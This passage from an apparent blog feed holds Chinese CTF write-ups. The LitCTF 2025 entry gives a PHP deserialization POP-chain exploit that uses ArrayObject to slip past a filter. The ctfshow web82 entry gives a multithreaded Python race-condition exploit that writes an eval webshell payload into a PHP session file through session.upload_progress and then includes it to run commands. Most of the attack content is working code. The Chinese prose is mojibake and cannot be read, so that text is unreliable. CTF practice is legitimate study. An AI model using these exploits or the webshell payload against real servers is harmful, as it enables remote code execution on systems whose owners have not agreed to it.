class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ¯æ¬¡è®¿é—®æˆ–åˆ·æ–°é¡µé¢åï¼Œå‡½æ•°ååçš„æ•°å­—ä¼šåŠ ä¸€ï¼Œä»<code>lambda_1</code>å¼€å§‹</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250527191555779.png" alt="image-20250527191555779"></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250527191609266.png" alt="image-20250527191609266"></p><p>ç„¶åæ˜¯æ‰¾ä¸€ä¸ªå¯ä»¥è°ƒç”¨åŒ¿åå‡½æ•°çš„åŸç”Ÿç±»ï¼Œå¯ä»¥æœåˆ°<code>ReflectionFunction</code>çš„<code>invoke</code>æ–¹æ³•å¯ä»¥è°ƒç”¨å·²å®šä¹‰çš„å‡½æ•°æˆ–åŒ¿åå‡½æ•°</p><blockquote><p><img src="/2025/05/30/LitCTF-2025-web/image-20250529125359558.png" alt="image-20250529125359558"></p><p><strong><code>ReflectionFunction</code>çš„å‚æ•°æ˜¯è¦è°ƒç”¨çš„å‡½æ•°åï¼Œ<code>invoke</code>çš„å‚æ•°æ˜¯è¢«è°ƒå‡½æ•°çš„å‚æ•°</strong></p><h3 id="è°ƒç”¨æ™®é€šå‡½æ•°"><a href="#è°ƒç”¨æ™®é€šå‡½æ•°" class="headerlink" title="è°ƒç”¨æ™®é€šå‡½æ•°"></a><strong>è°ƒç”¨æ™®é€šå‡½æ•°</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªæ™®é€šå‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>) </span>&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ ReflectionFunction åå°„è¯¥å‡½æ•°</span><br><span class="hljs-variable">$reflection</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-string">&#x27;add&#x27;</span>);<br><br><span class="hljs-comment">// é€šè¿‡ invoke() è°ƒç”¨å‡½æ•°</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$reflection</span>-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// è¾“å‡º: 8</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250529125207165.png" alt="image-20250529125207165"></p><h3 id="è°ƒç”¨åŒ¿åå‡½æ•°"><a href="#è°ƒç”¨åŒ¿åå‡½æ•°" class="headerlink" title="è°ƒç”¨åŒ¿åå‡½æ•°"></a><strong>è°ƒç”¨åŒ¿åå‡½æ•°</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåŒ¿åå‡½æ•°å¹¶èµ‹å€¼ç»™å˜é‡</span><br><span class="hljs-variable">$multiply</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>) </span>&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ ReflectionFunction åå°„åŒ¿åå‡½æ•°</span><br><span class="hljs-variable">$reflection</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$multiply</span>);<br><br><span class="hljs-comment">// é€šè¿‡ invoke() è°ƒç”¨åŒ¿åå‡½æ•°</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$reflection</span>-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-number">4</span>, <span class="hljs-number">6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// è¾“å‡º: 24</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250529125307573.png" alt="image-20250529125307573"></p></blockquote><p><strong><code>ReflectionFunction</code>çš„å‚æ•°æ˜¯è¦è°ƒç”¨çš„å‡½æ•°åï¼Œ<code>invoke</code>çš„å‚æ•°æ˜¯è¢«è°ƒå‡½æ•°çš„å‚æ•°</strong></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// ç”¨äºè§¦å‘Mitsuhaä¸­çš„__invoke()æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-comment">// è°ƒç”¨åŸç”Ÿç±»çš„invoke()æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// åœ¨__invoke()æ–¹æ³•ä¸­ä¸¤ä¸ªå±æ€§æ‹¼æ¥åä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼Œè§¦å‘__toString()æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// ç”¨äºè§¦å‘__call()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-comment">// å¯ä»¥è°ƒç”¨åŒ¿åå‡½æ•°çš„åŸç”Ÿç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-comment">// ç”±create_function()ç”Ÿæˆçš„åŒ¿åå‡½æ•°å</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\000lambda_1&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><span class="hljs-comment">// æŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨ï¼Œè§¦å‘__invoke()</span><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">// æŠŠå¯¹è±¡ä½œä¸ºå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œè§¦å‘__toString()</span><br><span class="hljs-variable">$b</span>-&gt;thread = <span class="hljs-variable">$c</span>;<br><span class="hljs-comment">// è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘__call()</span><br><span class="hljs-variable">$c</span>-&gt;soul = <span class="hljs-variable">$a</span>;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * åœ¨ KatawareDoki::__toString() ä¸­ï¼š</span><br><span class="hljs-comment"> * ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake, $this-&gt;name);</span><br><span class="hljs-comment"> * ç­‰ä»·äºï¼š</span><br><span class="hljs-comment"> * $a-&gt;flag(&quot;ReflectionFunction&quot;, &quot;\000lambda_1&quot;);</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// ä½¿ç”¨ArrayObjectå°è£…å¯¹è±¡</span><br><span class="hljs-comment">// å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼ä¸å…è®¸O:å’Œa:å¼€å¤´çš„</span><br><span class="hljs-comment">// ç»è¿‡ArrayObjectåºåˆ—åŒ–åä»¥C:å¼€å¤´ï¼ˆè¡¨ç¤º â€œå¯å…‹éš†å¯¹è±¡â€ï¼‰ï¼Œ</span><br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-web82-æ–‡ä»¶åŒ…å«-sessionåŒ…å«</title>
    <link href="/2025/05/25/ctfshow-web82-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-session%E5%8C%85%E5%90%AB/"/>
    <url>/2025/05/25/ctfshow-web82-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-session%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>web82-æ–‡ä»¶åŒ…å«-php_session_upload_progressæ–‡ä»¶åŒ…å«.md</p><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤æ‰äº†ç‚¹<code>.</code>ï¼Œè¿™æ ·<code>file</code>ä¸­å°±ä¸èƒ½å‡ºç°æ–‡ä»¶åäº†</p><p>å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p><p>å¼•ç”¨å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/288430.html">https://www.freebuf.com/articles/web/288430.html</a></p><blockquote><h2 id="ä»€ä¹ˆæ˜¯session-upload-progressï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯session-upload-progressï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯session.upload_progressï¼Ÿ"></a>ä»€ä¹ˆæ˜¯session.upload_progressï¼Ÿ</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">on</span><br><span class="hljs-attr">session.upload_progress.cleanup</span> = <span class="hljs-literal">on</span><br><span class="hljs-attr">session.upload_progress.prefix</span> = <span class="hljs-string">&quot;upload_progress_&quot;</span><br><span class="hljs-attr">session.upload_progress.name</span> = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></code></pre></td></tr></table></figure><ul><li>session.upload_progress.enabledå¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯session.upload_progressåŠŸèƒ½</li><li>session.upload_progress.cleanupå¯ä»¥æ§åˆ¶æ˜¯å¦åœ¨ä¸Šä¼ ä¹‹ååˆ é™¤æ–‡ä»¶å†…å®¹</li><li>session.upload_progress.prefixå¯ä»¥è®¾ç½®ä¸Šä¼ æ–‡ä»¶å†…å®¹çš„å‰ç¼€</li><li>session.upload_progress.nameçš„å€¼å³ä¸ºsessionä¸­çš„é”®å€¼</li></ul><h2 id="session-upload-progresså¼€å¯ä¹‹åä¼šæœ‰ä»€ä¹ˆæ•ˆæœï¼Ÿ"><a href="#session-upload-progresså¼€å¯ä¹‹åä¼šæœ‰ä»€ä¹ˆæ•ˆæœï¼Ÿ" class="headerlink" title="session.upload_progresså¼€å¯ä¹‹åä¼šæœ‰ä»€ä¹ˆæ•ˆæœï¼Ÿ"></a>session.upload_progresså¼€å¯ä¹‹åä¼šæœ‰ä»€ä¹ˆæ•ˆæœï¼Ÿ</h2><p>å½“æˆ‘ä»¬å°†<code>session.upload_progress.enabled</code>çš„å€¼è®¾ç½®ä¸º<strong>on</strong>æ—¶ï¼Œæ­¤æ—¶æˆ‘ä»¬å†å¾€æœåŠ¡å™¨ä¸­ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒPHPä¼šæŠŠè¯¥æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ã€‚</p><h4 id="é—®é¢˜ä¸€ï¼šå¦‚ä½•åˆå§‹åŒ–sessionå¹¶ä¸”æŠŠsessionä¸­çš„å†…å®¹å†™åˆ°æ–‡ä»¶ä¸­å»å‘¢ï¼Ÿ"><a href="#é—®é¢˜ä¸€ï¼šå¦‚ä½•åˆå§‹åŒ–sessionå¹¶ä¸”æŠŠsessionä¸­çš„å†…å®¹å†™åˆ°æ–‡ä»¶ä¸­å»å‘¢ï¼Ÿ" class="headerlink" title="é—®é¢˜ä¸€ï¼šå¦‚ä½•åˆå§‹åŒ–sessionå¹¶ä¸”æŠŠsessionä¸­çš„å†…å®¹å†™åˆ°æ–‡ä»¶ä¸­å»å‘¢ï¼Ÿ"></a>é—®é¢˜ä¸€ï¼šå¦‚ä½•åˆå§‹åŒ–sessionå¹¶ä¸”æŠŠsessionä¸­çš„å†…å®¹å†™åˆ°æ–‡ä»¶ä¸­å»å‘¢ï¼Ÿ</h4><p>æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œphp.iniä¸­<code>session.use_strict_mode</code>é€‰é¡¹é»˜è®¤æ˜¯0ï¼Œåœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è‡ªå·±å®šä¹‰è‡ªå·±çš„sessionidï¼Œä¾‹å¦‚å½“ç”¨æˆ·åœ¨cookieä¸­è®¾ç½®<code>sessionid=Lxxx</code>æ—¶ï¼ŒPHPå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶<code>/tmp/sess_Lxxx</code>ï¼Œæ­¤æ—¶ä¹Ÿå°±åˆå§‹åŒ–äº†sessionï¼Œå¹¶ä¸”ä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯å†™å…¥åˆ°æ–‡ä»¶<code>/tmp/sess_Lxxx</code>ä¸­å»ã€‚</p><h4 id="é—®é¢˜äºŒï¼šå½“session-upload-progress-cleanupçš„å€¼ä¸ºonæ—¶ï¼Œå³ä½¿ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸Šä¼ å®Œæˆä¹‹åæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸…ç©ºï¼Œæ€ä¹ˆåŠï¼Ÿ"><a href="#é—®é¢˜äºŒï¼šå½“session-upload-progress-cleanupçš„å€¼ä¸ºonæ—¶ï¼Œå³ä½¿ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸Šä¼ å®Œæˆä¹‹åæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸…ç©ºï¼Œæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="é—®é¢˜äºŒï¼šå½“session.upload_progress.cleanupçš„å€¼ä¸ºonæ—¶ï¼Œå³ä½¿ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸Šä¼ å®Œæˆä¹‹åæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸…ç©ºï¼Œæ€ä¹ˆåŠï¼Ÿ"></a>é—®é¢˜äºŒï¼šå½“session.upload_progress.cleanupçš„å€¼ä¸ºonæ—¶ï¼Œå³ä½¿ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸Šä¼ å®Œæˆä¹‹åæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸…ç©ºï¼Œæ€ä¹ˆåŠï¼Ÿ</h4><p>åˆ©ç”¨Pythonçš„å¤šçº¿ç¨‹ï¼Œè¿›è¡Œ<strong>æ¡ä»¶ç«äº‰</strong>ï¼ˆåœ¨ç³»ç»Ÿè‡ªåŠ¨æ¸…ç†å‰ï¼ŒæŠ¢å…ˆå®Œæˆæ–‡ä»¶åŒ…å«å¹¶æ‰§è¡Œä»£ç ã€‚è¿™ç§æ‰‹æ³•åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œæœ¬è´¨æ˜¯â€œèµ¶åœ¨ç³»ç»Ÿåˆ é™¤å‰æŠ¢å æ‰§è¡Œæƒâ€ï¼‰ã€‚</p><h2 id="å¦‚ä½•åˆ©ç”¨session-upload-progressè¿›è¡ŒRCEï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨session-upload-progressè¿›è¡ŒRCEï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨session.upload_progressè¿›è¡ŒRCEï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨session.upload_progressè¿›è¡ŒRCEï¼Ÿ</h2><p>ä»¥æœ¬é¢˜ä¸ºä¾‹</p></blockquote><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment"># ç›®æ ‡URL</span><br>target_url = <span class="hljs-string">&quot;http://642992dd-f043-4524-959c-2e46c7692533.challenge.ctf.show/&quot;</span><br><span class="hljs-comment"># è‡ªå®šä¹‰SESSIONID</span><br>sessid = <span class="hljs-string">&#x27;exp&#x27;</span><br><span class="hljs-comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><span class="hljs-comment"># æŒç»­å‘æœåŠ¡å™¨å‘é€è¯·æ±‚</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª50KBçš„å†…å­˜æ–‡ä»¶</span><br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        <span class="hljs-comment"># å‘ç›®æ ‡URLå‘é€è¯·æ±‚</span><br>        resp = session.post(<br>            target_url,<br>            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>            <span class="hljs-comment"># æ¨¡æ‹Ÿä¸Šä¼ æ–‡ä»¶ï¼Œè§¦å‘PHP_SESSION_UPLOAD_PROGRESSå¤„ç†</span><br>            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;test.txt&#x27;</span>, f)&#125;,<br>            <span class="hljs-comment"># è®¾ç½®PHPSESSID</span><br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;<br>        )<br><br><span class="hljs-comment"># æŒç»­å°è¯•è§¦å‘å¹¶è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># å°è¯•è¯»å–/tmpä¸‹åˆ›å»ºçš„ä¼šè¯æ–‡ä»¶sess_exp</span><br>        resp = session.post(<br>            target_url+ <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>            data=data<br>        )<br>        <span class="hljs-comment"># å¦‚æœå“åº”ä¸­åŒ…å«test.txtï¼Œè¯´æ˜å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ‰“å°ç»“æœå¹¶æ¸…é™¤äº‹ä»¶æ ‡å¿—</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;test.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+++++++++++++]retry&quot;</span>)<br><br><span class="hljs-comment"># å¤šçº¿ç¨‹è¿›è¡Œæ¡ä»¶ç«äº‰</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>        event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web82-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-session%E5%8C%85%E5%90%AB/image-20250525085859807.png" alt="image-20250525085859807"></p><p><img src="/2025/05/25/ctfshow-web82-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-session%E5%8C%85%E5%90%AB/image-20250525085940653.png" alt="image-20250525085940653"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>æ–‡ä»¶åŒ…å«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å« sessionåŒ…å«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-web81-æ–‡ä»¶åŒ…å«-æ—¥å¿—æ–‡ä»¶åŒ…å«</title>
    <link href="/2025/05/25/ctfshow-web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/05/25/ctfshow-web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
